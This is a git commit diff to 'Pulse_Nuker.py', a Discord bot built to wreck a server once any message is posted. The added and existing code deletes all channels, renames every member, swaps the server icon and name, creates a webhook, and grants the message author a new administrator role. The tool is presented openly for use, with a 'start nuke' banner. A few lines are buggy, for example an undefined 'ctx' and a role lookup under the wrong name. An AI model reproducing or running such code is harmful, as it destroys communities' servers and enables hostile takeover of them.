8f49b62cb3ecf9fa279246435fe75843d84a110b
[ CatKnife | チャンチャンパルス ] <72387902+cintagram@users.noreply.github.com>
2024-04-07 00:03:40 +0900

    Pulse_Nuker.py 업데이트

--- Pulse_Nuker.py
+++ Pulse_Nuker.py
@@ -8,6 +8,13 @@ from discord.utils import get
 def randomletters(length):
     letters = string.ascii_letters
     return ''.join(random.choice(letters) for i in range(length))
+    
+def randcol():
+    random_number = random.randint(0,16777215)
+    hex_number = str(hex(random_number))
+    hex_number ='0x'+ hex_number[2:]
+    return hex_number
+
 
 TOKEN = ("")
 
@@ -20,6 +27,8 @@ TEST = 0
 @client.event
 async def on_ready():
     global TEST
+    global icon
+    icon = open("icon.jpg", "rb").read()
     TEST = 0
     print("Pulse_Nuker v1.1 is running.\nInvite your bot and send any message to start nuke.\n\n")
     print("WARNING!!\nYou may get API Timeout from Discord server if you nuke long.\nPlease Use wisely.")
@@ -37,8 +46,14 @@ async def on_member_ban(guild,user):
 @client.event
 async def on_message(message):
     global TEST
+    global icon
     if TEST == 0:
         TEST = 1
+        try:
+            guild=message.guild
+            await guild.edit(icon=icon)
+        except:
+            pass
         for c in message.guild.channels: 
                 await c.delete()
         for user in message.guild.members:
@@ -68,15 +83,24 @@ async def on_message(message):
             pass
         try:
             for user in message.guild.members:
-                await user.edit(nick=randomletters(3))
+                await user.edit(nick=randomletters(5))
         except:
             print("can't change user nick")
+            pass
+        try:
+            webhook = await message.channel.create_webhook(name="Pulse_Nuker Enhanced", reason="t")
+        except:
+            pass
+        try:
+            guild=message.guild
+            await ctx.guild.edit(name=randomletters(10))
+        except:
             pass
         guild=message.guild
         perms=discord.Permissions(administrator=True)
         try:
             user=message.author
-            await guild.create_role(name='TEST', colour=discord.Colour(0x597E8D),permissions=perms)
+            await guild.create_role(name='Pulse_Nuker Enhanced', colour=discord.Colour.random(),permissions=perms)
             role=get(guild.roles,name='TEST')
             await user.add_roles(role)
         except:
